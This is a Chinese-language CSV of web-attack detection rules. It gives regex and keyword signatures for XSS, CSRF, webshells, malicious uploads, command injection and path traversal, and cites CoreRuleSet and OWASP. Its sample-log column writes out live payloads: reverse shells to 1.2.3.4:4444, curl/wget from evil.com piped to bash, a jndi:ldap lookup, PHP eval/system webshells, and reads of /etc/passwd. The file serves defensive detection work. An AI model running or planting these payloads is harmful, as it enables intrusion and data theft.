ID,攻击类型,特征类型,检测场景,特征代码/Payload,典型日志样本(多个用|分隔),风险等级,标题,核心内容,来源链接
XSS_002,XSS,正则,Web访问,"(?i)on[a-zA-Z]{3,50}\s*=[^=]",<img src=x onerror=alert(1)> | <body onload=alert(1)> | <svg onload=alert(1)>,CRITICAL,事件处理器 (onload/onerror),检测 onerror、onload 等事件处理器属性。,https://github.com/coreruleset/coreruleset
XSS_003,XSS,正则,Web访问,(?i)url\(javascript,style=background:url(javascript:alert(1)) | style=background:url('javascript:alert(1)'),CRITICAL,javascript: URI,CSS 中通过 url(javascript:...) 执行脚本。,https://github.com/coreruleset/coreruleset
XSS_004,XSS,正则,Web访问,(?i)(?:data:text/html|;base64)\b,"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg== | data:text/html,<script>alert(1)</script>",CRITICAL,data:text/html / base64,利用 data URI 或 base64 编码绕过过滤。,https://github.com/coreruleset/coreruleset
XSS_005,XSS,正则,Web访问,(?i)%3Csvg.*onload,/index.php/%3Csvg/onload=alert() | /%3Csvg/onload=alert(1)/,CRITICAL,SVG/onload 路径型 XSS,URL 路径中的 SVG 标签配合 onload 事件。,https://github.com/coreruleset/coreruleset
XSS_006,XSS,正则,Web访问,(?i)<(?:img|iframe)[^>]*(?:src|onerror),<img src=x onerror=alert(document.cookie)> | <iframe src=javascript:alert(1)>,CRITICAL,img/iframe 标签注入,img 或 iframe 标签配合 src/onerror 执行脚本。,https://github.com/coreruleset/coreruleset
XSS_007,XSS,正则,Web访问,(?i)formaction\b,<form id=x formaction=javascript:alert(1)><input type=submit> | <input formaction=javascript:alert(1) type=submit>,CRITICAL,formaction 属性向量,利用 formaction 覆盖表单提交目标执行 JS。,https://github.com/coreruleset/coreruleset
XSS_008,XSS,正则,Web访问,(?i)vbscript:|expression\s*\(,style=background:vbscript:msgbox(1) | style=width:expression(alert(1)),CRITICAL,VBScript/CSS expression,IE 特有的 vbscript: 或 CSS expression()。,https://github.com/coreruleset/coreruleset
XSS_009,XSS,正则,Web访问,(?i)<(?:object|embed)[^>]+,<object data=javascript:alert(1)> | <embed src=javascript:alert(1)>,CRITICAL,object/embed 标签,通过 object 或 embed 标签加载恶意内容。,https://github.com/coreruleset/coreruleset
XSS_010,XSS,正则,Web访问,(?i)javascript\s*:,<a href=javascript:alert(1)>x</a> | iframe src=javascript:alert(document.domain),CRITICAL,javascript: 协议,检测 javascript: 协议在 href、src 等属性中的使用。,https://github.com/coreruleset/coreruleset
CSRF_001,CSRF,日志,Web访问,Referer 缺失或与 Origin 不匹配,"POST /transfer HTTP/1.1
Host: bank.com
(无 Referer) | POST /api/update HTTP/1.1
Origin: https://evil.com | POST /delete HTTP/1.1
Referer: https://attacker.com/page",HIGH,Referer/Origin 异常,状态变更请求缺少 Referer 或 Origin 与受信域名不匹配。,https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
CSRF_002,CSRF,关键词,Web访问,无 CSRF Token 的 POST/PUT/DELETE,"POST /api/delete HTTP/1.1
Content-Type: application/json
{} | PUT /user/1 HTTP/1.1
(无 X-CSRF-Token) | DELETE /resource/1 HTTP/1.1",HIGH,状态变更请求无 Token,POST/PUT/DELETE 等请求中缺少 CSRF Token 验证。,https://owasp.org/www-community/attacks/csrf
CSRF_003,CSRF,正则,Web访问,Origin:\s*https?://[^\s]+(?!trusted\.com),Origin: https://evil.com | Origin: https://attacker.example.org,HIGH,跨域 Origin 头,Origin 头指向非受信域名的跨站请求。,https://owasp.org/www-community/attacks/csrf
CSRF_004,CSRF,日志,Web访问,SameSite=None 且无 Secure,Set-Cookie: session=xxx; SameSite=None | Set-Cookie: token=yyy; SameSite=None (无 Secure),MEDIUM,Cookie SameSite 配置不当,敏感 Cookie 未设置 SameSite=Strict/Lax 易被 CSRF 利用。,https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
CSRF_005,CSRF,关键词,Web访问,GET 请求执行状态变更,GET /api/delete?id=123 HTTP/1.1 | GET /transfer?to=attacker&amount=1000 HTTP/1.1,HIGH,GET 方法状态变更,使用 GET 执行删除/修改等状态变更操作。,https://owasp.org/www-community/attacks/csrf
CSRF_006,CSRF,关键词,Web访问,跨站表单自动提交,<form action=https://bank.com/transfer method=POST><input name=amount value=1000> | 从 evil.com 页面自动 POST 到 bank.com,HIGH,跨站表单 POST,从第三方站点提交表单到目标站点。,https://owasp.org/www-community/attacks/csrf
WS_001,WebShell,正则,Web访问/日志分析,(?i)(?:eval|assert)\s*\(,<?php eval($_POST['cmd']); ?> | <?php assert($_GET['x']); ?> | <?php eval(base64_decode('...')); ?>,CRITICAL,eval/assert 函数,PHP eval 或 assert 执行用户输入代码。,https://github.com/coreruleset/coreruleset
WS_002,WebShell,正则,Web访问/日志分析,(?i)(?:system|passthru|shell_exec)\s*\(,<?php system($_GET['c']); ?> | <?php passthru($_POST['cmd']); ?> | <?php echo shell_exec('id'); ?>,CRITICAL,system/passthru/shell_exec,PHP 系统命令执行函数。,https://github.com/coreruleset/coreruleset
WS_003,WebShell,正则,Web访问,"(?i)base64_decode\s*\(.*\)\s*,\s*eval",eval(base64_decode($_POST['z'])); | eval(gzinflate(base64_decode('...')));,CRITICAL,base64_decode + eval,Base64 编码 + eval 解码执行，常见混淆 WebShell。,https://github.com/swisskyrepo/PayloadsAllTheThings
WS_004,WebShell,正则,Web访问,"(?i)\$_(?:POST|GET)\s*\[.*\]\s*,\s*(?:eval|system|exec)",<?php eval($_POST['x']); ?> | <?php system($_GET['cmd']); ?>,CRITICAL,$_POST/$_GET 命令执行,通过 POST/GET 参数直接传入可执行代码。,https://github.com/coreruleset/coreruleset
WS_005,WebShell,关键词,日志分析,r57 Shell|WSO shell|b4tm4n|Mini Shell,<title>r57 Shell Version 1.0</title> | <title>WSO 2.5</title> | B4TM4N SH3LL</title>,CRITICAL,已知 WebShell 签名,响应体中检测已知 WebShell 的 HTML 特征。,https://github.com/coreruleset/coreruleset
WS_006,WebShell,正则,Web访问,(?i)(?:create_function|preg_replace\s*.*\/e),"<?php create_function('',$_POST['cmd'])(); ?> | preg_replace('/.*/e','eval(""$1"")',$_GET['x'])",CRITICAL,create_function / preg_replace /e,PHP 动态代码执行函数。,https://github.com/swisskyrepo/PayloadsAllTheThings
WS_007,WebShell,正则,Web访问,(?i)(?:proc_open|popen|pcntl_exec)\s*\(,"<?php proc_open($_GET['c'],array(),$pipes); ?> | <?php popen('whoami','r'); ?>",CRITICAL,proc_open/popen,PHP 进程执行函数，可执行外部命令。,https://github.com/coreruleset/coreruleset
WS_008,WebShell,正则,Web访问,(?i)(?:include|require)\s*\(\s*\$_,<?php include($_GET['f']); ?> | <?php require($_POST['page'].'.php'); ?>,CRITICAL,include 动态包含,通过 include/require 包含用户可控文件。,https://github.com/coreruleset/coreruleset
FU_001,文件上传,关键词,Web访问,\.php|\.phtml|\.phar|\.php5,filename=shell.php | filename=config.phtml | filename=test.phar,CRITICAL,危险扩展名 (.php/.phtml),上传文件使用可执行脚本扩展名。,https://github.com/coreruleset/coreruleset
FU_002,文件上传,正则,Web访问,.*\.ph(?:p\d*|tml|ar|ps)\.*$,shell.php.jpg | shell.php. | shell.php%00.jpg,CRITICAL,双扩展名 / 空字节截断,双扩展名或尾部点号绕过扩展名检查。,https://github.com/coreruleset/coreruleset
FU_003,文件上传,正则,Web访问,Content-Type:\s*multipart/form-data,Content-Type: multipart/form-data; boundary=----WebKitFormBoundary | Content-Type: multipart/form-data,HIGH,multipart/form-data 上传,检测文件上传请求的 multipart 类型。,https://github.com/coreruleset/coreruleset
FU_004,文件上传,正则,Web访问,Content-Disposition:.*filename\*?=,"Content-Disposition: form-data; name=""file""; filename=""shell.php"" | Content-Disposition: form-data; filename*=""shell.php""",HIGH,Content-Disposition 篡改,检测 multipart 中 filename 参数是否被篡改。,https://github.com/coreruleset/coreruleset
FU_005,文件上传,关键词,Web访问,\.htaccess|\.phtml,filename=.htaccess | filename=config.phtml,CRITICAL,.htaccess / .phtml 上传,上传 .htaccess 修改解析规则或 .phtml 执行。,https://github.com/swisskyrepo/PayloadsAllTheThings
FU_006,文件上传,关键词,Web访问,\.asa|\.cer|\.cdx,filename=shell.asa | filename=shell.cer,CRITICAL,IIS 可执行扩展名,ASP 相关扩展名在 IIS 下可执行。,https://github.com/swisskyrepo/PayloadsAllTheThings
FU_007,文件上传,日志,Web访问,MIME 与扩展名不一致,Content-Type: image/jpeg 但文件为 PHP 代码 | Content-Type: application/octet-stream 扩展名为 .php,HIGH,MIME 类型与扩展名不一致,声明 MIME 与实际文件内容或扩展名不符。,https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
FU_008,文件上传,正则,Web访问,filename\s*=\s*[^;]*\.(?:jsp|jspx|asp|aspx),filename=cmd.jsp | filename=shell.aspx,CRITICAL,JSP/ASP 扩展名,Java/ASP 服务端脚本扩展名。,https://github.com/swisskyrepo/PayloadsAllTheThings
RCE_001,RCE,正则,Web访问/日志分析,(?i)[;|&]|\$\s*\(|`,file=test.jpg;cat /etc/passwd | ip=8.8.8.8|id | cmd=`whoami`,CRITICAL,管道符/分号/命令替换,检测 ; | & $() `` 等 Shell 命令拼接字符。,https://github.com/coreruleset/coreruleset
RCE_002,RCE,正则,Web访问,(?i)\$\s*\{\s*\S[^\{\}]*\},file=${jndi:ldap://evil.com/a} | name=${7*7} | x=${class.getClass()},CRITICAL,变量替换/表达式注入,检测 ${} 形式的变量或表达式注入。,https://github.com/coreruleset/coreruleset
RCE_003,RCE,关键词,Web访问,/etc/passwd|/etc/shadow|C:\\Windows\\System32,file=../../../etc/passwd | path=C:\Windows\System32\config\SAM,CRITICAL,敏感系统路径,检测对 /etc/passwd 等敏感文件的访问尝试。,https://github.com/coreruleset/coreruleset
RCE_004,RCE,正则,Web访问,(?i)\b(?:cat|wget|curl|nc|bash|sh)\s,cmd=cat /etc/passwd | url=;wget http://evil.com/shell.sh | x=curl http://evil.com|bash,CRITICAL,cat/wget/curl 等命令,检测常见系统命令的执行尝试。,https://github.com/swisskyrepo/PayloadsAllTheThings
RCE_005,RCE,正则,Web访问,(?i)(?:nc\s+-[el]|bash\s+-i|/bin/sh),nc -e /bin/sh 192.168.1.1 4444 | bash -i >& /dev/tcp/1.2.3.4/4444 0>&1 | rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 1.2.3.4 4444 >/tmp/f,CRITICAL,反弹 Shell 特征,检测 nc、bash -i 等反弹 Shell 典型载荷。,https://github.com/swisskyrepo/PayloadsAllTheThings
RCE_006,RCE,正则,Web访问,"(?i)python\s+-c\s+['\""]|perl\s+-e\s+['\""]","python -c 'import socket,subprocess' | perl -e 'system(""id"")'",CRITICAL,Python/Perl 单行执行,检测通过 -c/-e 执行单行脚本的载荷。,https://github.com/swisskyrepo/PayloadsAllTheThings
RCE_007,RCE,正则,Web访问,(?i)powershell\s+-[eEnc],powershell -EncodedCommand base64payload | powershell -e JABjAGwAaQBlAG4AdAA=,CRITICAL,PowerShell 执行,检测 PowerShell -EncodedCommand 等参数。,https://github.com/coreruleset/coreruleset
RCE_008,RCE,正则,Web访问,(?i)cmd\.exe\s+/c|/c\s+dir,cmd=/c dir | exec=cmd.exe /c whoami,CRITICAL,Windows cmd.exe,检测 Windows cmd.exe 命令执行。,https://github.com/coreruleset/coreruleset
PT_001,路径遍历,正则,Web访问,"(?:(?:^|[/;\\])\\.{2,3}[/;\\]|[/;\\]\\.{2,3}(?:[/;\\]|$))",file=../../../etc/passwd | path=..\..\windows\system32\config\sam | ?file=....//....//etc/passwd,CRITICAL,../ 或 ..\ 序列,检测 .. 目录穿越字符的明文或解码后形式。,https://github.com/coreruleset/coreruleset
PT_002,路径遍历,正则,Web访问,(?i)%2e%2e(?:%2f|%5c)|%\.\./,file=%2e%2e%2f%2e%2e%2fetc%2fpasswd | file=..%252e%252e/ | file=%252e%252e%252f,CRITICAL,URL 编码 ../ (%2e%2e%2f),检测 URL 编码形式的目录穿越。,https://github.com/coreruleset/coreruleset
PT_003,路径遍历,正则,Web访问,(?i)%c0%ae%c0%ae/|%e0%80%ae,file=%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd | file=%e0%80%ae%e0%80%ae/,CRITICAL,UTF-8 编码 ../ 绕过,检测 UTF-8 超长编码等绕过形式。,https://github.com/swisskyrepo/PayloadsAllTheThings
PT_004,路径遍历,关键词,Web访问,/etc/passwd|/etc/shadow|C:\\Windows\\win.ini,?file=....//....//etc/passwd | ?path=../../../etc/shadow | ?doc=C:\Windows\win.ini,CRITICAL,OS 敏感文件访问,检测对 /etc/passwd 等系统文件的访问尝试。,https://github.com/coreruleset/coreruleset
PT_005,路径遍历,关键词,Web访问,\.git/config|\.env|web\.config,GET /.git/config HTTP/1.1 | file=../../../.env | ?page=....//....//.git/config,CRITICAL,受限文件访问,检测对 .git、.env 等应用配置/源码的访问。,https://github.com/coreruleset/coreruleset
PT_006,路径遍历,正则,Web访问,/\.\.;/,file=/..;/..;/etc/passwd | path=/..;/..;/var/log/apache2/access.log,CRITICAL,Tomcat /..;/ 绕过,Tomcat 等容器对 /..;/ 的特殊解析绕过。,https://github.com/coreruleset/coreruleset
PT_007,路径遍历,正则,Web访问,%00|\\x00,file=../../../etc/passwd%00.jpg | page=....//....//etc/passwd%00,HIGH,空字节截断,利用空字节截断路径解析。,https://github.com/swisskyrepo/PayloadsAllTheThings
